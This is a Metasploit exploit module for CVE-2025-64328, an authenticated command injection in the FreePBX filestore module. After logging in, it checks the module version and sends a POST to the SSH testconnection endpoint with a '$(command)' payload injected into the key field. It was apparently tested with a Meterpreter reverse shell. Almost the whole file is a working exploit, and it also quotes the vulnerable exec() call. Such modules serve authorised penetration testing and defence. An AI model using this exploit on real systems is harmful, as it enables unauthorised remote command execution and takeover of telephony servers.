##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::FreePBX
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreePBX filestore authenticated command injection',
        'Description' => %q{
          This module exploits an authenticated command injection vulnerability (CVE-2025-64328) in the
          FreePBX filestore module. The filestore module allows administrators to configure remote file
          storage backends (SSH, FTP, etc.) for backup and file management purposes.

          The vulnerability exists in the SSH driver's testconnection functionality, specifically in the
          check_ssh_connect() function located at /admin/modules/filestore/drivers/SSH/testconnection.php.
          The function accepts user-controlled input for the SSH key path parameter, which is then passed
          unsanitized to exec() calls when generating SSH keys.

          The vulnerable code executes commands such as:
          exec("ssh-keygen -t ecdsa -b 521 -f $key -N \"\" && chown asterisk:asterisk $key && chmod 600 $key");

          By injecting shell command substitution syntax (e.g., $(command)) into the key parameter, an
          authenticated user can execute arbitrary commands on the underlying system with the privileges of
          the web server process (typically the asterisk user).

          This vulnerability affects filestore module versions 17.0.2.36 through 17.0.2.44 (introduced in
          17.0.2.36, patched in 17.0.3). The module requires valid FreePBX credentials for a user account that
          has access to the filestore module. The user must be in the "Filestore" group (administrator or
          low-privilege user).

          Note: Due to the vulnerable code structure, the injected command may be executed multiple times,
          potentially resulting in multiple Meterpreter sessions.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Cory Billington',                            # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-64328'],
          ['URL', 'https://github.com/FreePBX/security-reporting/security/advisories/GHSA-vm9p-46mv-5xvw'],
          ['URL', 'https://theyhack.me/CVE-2025-64328-FreePBX-Authenticated-Command-Injection/']
        ],
        'Platform' => %w[unix linux],
        'Arch' => ARCH_CMD,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-11-08',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [false, 'The URI for the FreePBX installation', '/']),
        OptString.new('USERNAME', [true, 'FreePBX username (must be in the "Filestore" group)', 'admin']),
        OptString.new('PASSWORD', [true, 'FreePBX admin password', ''])
      ]
    )
  end

  def check
    cookie = freepbx_login(datastore['USERNAME'], datastore['PASSWORD'])
    return CheckCode::Unknown('Authentication failed') unless cookie

    # Try to get filestore version
    version = get_filestore_version
    return CheckCode::Appears('Filestore module is accessible') unless version

    # Version 17.0.3 and above are patched
    return CheckCode::Safe("Patched filestore version #{version} detected") unless Rex::Version.new(version) < Rex::Version.new('17.0.3')

    # Version 17.0.2.36 is the first vulnerable version (file was introduced in this version)
    if Rex::Version.new(version) < Rex::Version.new('17.0.2.36')
      return CheckCode::Safe("Filestore version #{version} is not vulnerable (vulnerability introduced in 17.0.2.36)")
    end

    CheckCode::Appears("Vulnerable filestore version #{version} detected")
  end

  def authenticate
    @cookie ||= freepbx_login(datastore['USERNAME'], datastore['PASSWORD'])
    fail_with(Failure::NoAccess, 'Authentication failed') unless @cookie
    @cookie
  end

  def get_filestore_version
    authenticate unless @cookie

    # Get version from the filestore page HTML (JavaScript includes version)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'config.php'),
      'cookie' => @cookie,
      'headers' => { 'Referer' => freepbx_referer },
      'vars_get' => {
        'display' => 'filestore'
      }
    )

    return nil unless res&.code == 200

    # Extract version from JavaScript file reference: filesystem.js?load_version=17.0.2.44
    match = res.body.match(/filesystem\.js\?load_version=(\d+\.\d+\.\d+\.\d+)/)
    match ? match[1] : nil
  end

  def send_filestore_request(vars_post = {})
    cookie = authenticate

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'ajax.php'),
      'cookie' => cookie,
      'headers' => {
        'Referer' => freepbx_referer,
        'Content-Type' => 'application/x-www-form-urlencoded'
      },
      'vars_get' => {
        'module' => 'filestore',
        'command' => 'testconnection',
        'driver' => 'SSH'
      },
      'vars_post' => vars_post
    )
  end

  def execute_command(cmd, _opts = {})
    send_filestore_request(
      'host' => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}",
      'port' => rand(1024..65535).to_s,
      'user' => Rex::Text.rand_text_alphanumeric(8),
      'key' => "$(#{cmd})",
      'path' => "/#{Rex::Text.rand_text_alphanumeric(8)}"
    )
  end

  def exploit
    authenticate
    version = get_filestore_version
    vprint_status("Filestore module version: #{version}") if version
    execute_command(payload.encoded)
  end
end
